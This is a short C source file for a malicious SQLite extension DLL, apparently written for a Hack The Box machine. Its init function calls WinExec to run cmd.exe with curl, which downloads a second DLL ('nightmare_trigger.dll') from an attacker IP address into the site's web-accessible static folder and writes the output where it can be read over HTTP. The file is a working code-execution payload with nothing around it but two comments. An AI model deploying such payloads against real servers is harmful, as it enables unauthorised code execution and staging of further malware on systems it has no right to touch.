
#include <windows.h>

__declspec(dllexport) int sqlite3_extension_init(void *db, char **errmsg, void *api) {
    // Execute command and redirect output to static directory
    // Output readable via: http://eloquia.htb/static/output_2jiuhhah.txt
    WinExec("cmd.exe /c curl http://10.10.15.49:9999/nightmare_trigger.dll -o C:\\Web\\Eloquia\\static\\nightmare_trigger.dll 2>&1 > C:\\Web\\Eloquia\\static\\output_2jiuhhah.txt 2>&1", 0);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    return TRUE;
}
